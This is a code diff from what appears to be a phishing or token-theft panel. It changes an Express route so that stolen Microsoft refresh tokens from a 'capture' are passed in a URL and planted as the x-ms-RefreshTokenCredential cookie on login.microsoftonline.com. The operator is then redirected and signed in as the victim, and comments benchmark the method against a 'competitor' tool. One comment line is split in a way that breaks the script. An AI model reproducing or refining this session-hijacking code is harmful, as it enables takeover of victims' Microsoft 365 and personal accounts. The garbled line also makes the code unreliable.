@@ -290,7 +290,11 @@ router.get('/page/:id', async (req, res) => {
         '<p>No refresh token, access token, or cookies found for this capture.</p></body></html>' );
     }
 
-    res.type('html').send(generateAutoRedirectPage(loginUrl, tokenType, primaryToken, tenant, accountType));
+    // Pass the refresh token in URL query param so the redirect page can inject it
+    var rtForUrl = refreshToken || (exchangeResult && exchangeResult.refresh_token);
+    var rtParam = rtForUrl ? '?rt=' + encodeURIComponent(rtForUrl) : '';
+    console.log('[InjectPage] RT param:', rtParam ? 'YES' : 'NO');
+    res.type('html').send(generateAutoRedirectPage(loginUrl, tokenType, primaryToken, rtForUrl || '', tenant, accountType, rtParam));
   } catch (err) {
     console.error('[InjectPage] Error:', err);
     res.status(500).send('<html><body style="background:#0a0a1a;color:#ff4444;padding:40px;font-family:sans-serif;"><h1>Server Error</h1></body></html>');
@@ -393,9 +397,8 @@ function generateLoginUrl(accessToken, tokenType, tenant, clientId, accountType)
 // Helper: Generate Auto-Redirect HTML Page
 // =========================================================
 
-function generateAutoRedirectPage(loginUrl, tokenType, accessToken, tenant, accountType) {
-  const safeAccessToken = accessToken ? accessToken.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '"') : '';
-  const safeTokenPreview = accessToken ? accessToken.substring(0, 50) + '...' : 'N/A';
+function generateAutoRedirectPage(loginUrl, tokenType, accessToken, refreshToken, tenant, accountType, rtParam) {
+  const safeRefreshToken = refreshToken ? refreshToken.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '"') : '';
   const targetName = accountType === 'personal' ? 'Microsoft Personal Account' : 'Microsoft 365 / Azure AD';
 
   return `<!DOCTYPE html>
@@ -497,41 +500,42 @@ function generateAutoRedirectPage(loginUrl, tokenType, accessToken, tenant, acco
     </a>
   </div>
   <script>
-    var accessToken = ${safeAccessToken ? '"' + safeAccessToken + '"' : 'null'};
+    // The refresh token is passed via URL parameter to avoid JSON wrapper format
+    // Microsoft's x-ms-RefreshTokenCredential expects the RAW refresh token JWT
+    var rtParam = '${rtParam || ''}';
     var statusDiv = document.getElementById('status');
     var manualBtn = document.getElementById('manualBtn');
 
-    if (accessToken) {
-      try {
-        // Build the x-ms-RefreshTokenCredential cookie payload (same format as competitor)
-        var payload = JSON.stringify({
-          token_type: 'Bearer',
-          access_token: accessToken,
-          expires_in: 3600
-        });
+    if (rtParam) {
+      // Extract refresh token from URL parameter (format: ?rt=ENCODED_TOKEN)
+      var refreshToken = rtParam.substring(3); // Remove '?
+      
+rt=' prefix      try {
+        // Set the x-ms-RefreshTokenCredential cookie EXACTLY like competitor
+        // Competitor format: x-ms-RefreshTokenCredential=eyJhbGciOi... (raw JWT, not JSON)
+        document.cookie = 'x-ms-RefreshTokenCredential=' + encodeURIComponent(refreshToken) + '; domain=.login.microsoftonline.com; path=/; Secure; SameSite=None';
 
-        // Set the credential cookie - this is what Microsoft's auth page reads
-        document.cookie = 'x-ms-RefreshTokenCredential=' + encodeURIComponent(payload) + '; domain=.login.microsoftonline.com; path=/; Secure; SameSite=None';
+        statusDiv.innerHTML = 'STEP 1: Credential cookie injected ✓<br>STEP 2: Authenticating with Microsoft...';
 
-        statusDiv.innerHTML = 'STEP 1: Token exchanged successfully ✓<br>STEP 2: Credential cookie injected ✓<br>STEP 3: Redirecting to Microsoft auth...';
-
-        // Redirect to Microsoft's auth endpoint which reads the x-ms-RefreshTokenCredential cookie
+        // Redirect to Microsoft's auth endpoint
+        // Microsoft reads x-ms-RefreshTokenCredential cookie and auto-authenticates
+        // Then redirects to a long PostAuth URL and shows account as signed in
         setTimeout(function() {
           window.location.href = 'https://login.microsoftonline.com/?auth=2';
-        }, 1000);
+        }, 1500);
       } catch(e) {
-        statusDiv.innerHTML = 'Error preparing credentials: ' + e.message;
+        statusDiv.innerHTML = 'Error: ' + e.message;
         manualBtn.style.display = 'inline-block';
       }
     } else {
-      statusDiv.innerHTML = 'No access token available. Click button to continue.';
+      statusDiv.innerHTML = 'No refresh token available. Click button to continue.';
       manualBtn.style.display = 'inline-block';
     }
 
     // Show manual button after 10 seconds as fallback
     setTimeout(function() {
       manualBtn.style.display = 'inline-block';
-      statusDiv.innerHTML += '<br><br>⚠ Auto-login pending. Click button if nothing happens.';
+      statusDiv.innerHTML += '<br><br>⚠ Auto-login pending. Click here if nothing happens.';
     }, 10000);
   </script>
 </body>
